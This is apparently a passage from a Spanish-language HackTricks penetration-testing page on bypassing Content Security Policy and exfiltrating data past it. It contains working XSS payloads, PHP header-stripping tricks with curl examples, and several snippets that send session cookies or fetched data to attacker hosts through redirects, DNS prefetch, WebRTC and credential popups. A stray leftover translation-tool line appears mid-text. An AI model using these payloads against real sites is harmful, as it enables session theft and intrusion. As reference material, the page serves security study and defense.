### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Información con CSP e iframe

- Se crea un `iframe` que apunta a una URL (llamémosla `https://example.redirect.com`) que está permitida por CSP.
- Esta URL luego redirige a una URL secreta (p. ej., `https://usersecret.example2.com`) que **no está permitida** por CSP.
- Al escuchar el evento `securitypolicyviolation`, se puede capturar la propiedad `blockedURI`. Esta propiedad revela el dominio del URI bloqueado, leaking el dominio secreto al que la URL inicial redirigió.

Es interesante notar que navegadores como Chrome y Firefox tienen comportamientos diferentes al manejar iframes con respecto a CSP, lo que puede conducir a potencial leakage de información sensible debido a comportamientos indefinidos.

Otra técnica implica explotar el propio CSP para deducir el subdominio secreto. Este método se basa en un algoritmo de búsqueda binaria y en ajustar el CSP para incluir dominios específicos que se bloquean deliberadamente. Por ejemplo, si el subdominio secreto está compuesto por caracteres desconocidos, puedes probar iterativamente distintos subdominios modificando la directiva CSP para bloquear o permitir esos subdominios. Aquí hay un fragmento que muestra cómo podría configurarse el CSP para facilitar este método:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Al monitorizar qué solicitudes son bloqueadas o permitidas por la CSP, se pueden reducir los posibles caracteres en el subdominio secreto, eventualmente descubriendo la URL completa.

Ambos métodos explotan las sutilezas de la implementación de CSP y el comportamiento en los navegadores, demostrando cómo políticas aparentemente seguras pueden, inadvertidamente, leak información sensible.

Truco de [**aquí**](https://ctftime.org/writeup/29310).

## Tecnologías inseguras para evadir CSP

### Errores de PHP cuando hay demasiados parámetros

Según la [**última técnica comentada en este video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), enviar demasiados parámetros (1001 parámetros GET aunque también se puede hacer con parámetros POST y con más de 20 archivos). Cualquier **`header()`** definido en el código web PHP **no será enviado** debido al error que esto provocará.

### Sobrecarga del buffer de respuesta de PHP

PHP es conocido por **almacenar en buffer la respuesta hasta 4096** bytes por defecto. Por lo tanto, si PHP muestra una advertencia, al proporcionar **suficientes datos dentro de las advertencias**, la **respuesta** será **enviada** **antes** del **CSP header**, provocando que el header sea ignorado.\
La técnica consiste básicamente en **llenar el buffer de respuesta con advertencias** para que el **CSP header** no sea enviado.

Idea de [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Desactivar CSP vía max_input_vars (headers already sent)

Como los headers deben enviarse antes de cualquier salida, las advertencias emitidas por PHP pueden invalidar llamadas posteriores a `header()`. Si la entrada del usuario excede `max_input_vars`, PHP lanza primero una advertencia de inicio; cualquier `header('Content-Security-Policy: ...')` posterior fallará con “headers already sent”, deshabilitando efectivamente la CSP y permitiendo XSS reflejada que de otro modo estaría bloqueada.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
No se proporcionó el contenido a traducir. Por favor pega el contenido de src/pentesting-web/content-security-policy-csp-bypass/README.md para traducir.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Reescribir la página de error

Según [**this writeup**](https://blog.ssrf.kr/69) parece que fue posible eludir una protección CSP cargando una página de error (potencialmente sin CSP) y reescribiendo su contenido.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME es una técnica que abusa de un XSS (o XSS muy limitado) **en un endpoint de una página** para **abusar** **de otros endpoints del mismo origen.** Esto se hace cargando el endpoint vulnerable desde una página atacante y luego refrescando la página atacante hacia el endpoint real en el mismo origen que quieres abusar. De esta forma el **endpoint vulnerable** puede usar el objeto **`opener`** en la **payload** para **acceder al DOM** del **endpoint real a abusar**. Para más información consulta:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Además, **wordpress** tiene un endpoint **JSONP** en `/wp-json/wp/v2/users/1?_jsonp=data` que **reflejará** los **datos** enviados en la salida (con la limitación de solo letras, números y puntos).

Un atacante puede abusar de ese endpoint para **generar un SOME attack** contra WordPress e **incrustarlo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` ten en cuenta que este **script** será **cargado** porque está **permitido por 'self'**. Además, y debido a que WordPress está instalado, un atacante podría abusar del **SOME attack** a través del **vulnerable** **callback** endpoint que **elude la CSP** para otorgar más privilegios a un usuario, instalar un nuevo plugin...\  
Para más información sobre cómo realizar este ataque consulta [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Si hay una CSP estricta que no te permite **interactuar con servidores externos**, hay algunas cosas que siempre puedes hacer para exfiltrar la información.

### Location

Puedes simplemente actualizar la location para enviar al servidor del atacante la información secreta:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Puedes redirigir inyectando una meta tag (esto es solo una redirección, esto no causará un leak de contenido)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Para cargar las páginas más rápido, los navegadores van a pre-resolver los nombres de host en direcciones IP y almacenarlos en caché para uso posterior.\
Puedes indicar a un navegador que pre-resuelva un nombre de host con: `<link rel="dns-prefetch" href="something.com">`

Podrías abusar de este comportamiento para **exfiltrar información sensible mediante solicitudes DNS**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Otra forma:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Para evitar que esto ocurra, el servidor puede enviar la cabecera HTTP:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Aparentemente, esta técnica no funciona en navegadores headless (bots)

### WebRTC

En varias páginas puedes leer que **WebRTC no comprueba la directiva `connect-src`** del CSP.

En realidad puedes _leak_ información usando una _solicitud DNS_. Mira este código:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Otra opción:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

La ventana emergente de credenciales envía una solicitud DNS a iconURL sin estar restringida por la página. Solo funciona en un contexto seguro (HTTPS) o en localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Comprobación de políticas CSP en línea

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Creación automática de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referencias

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
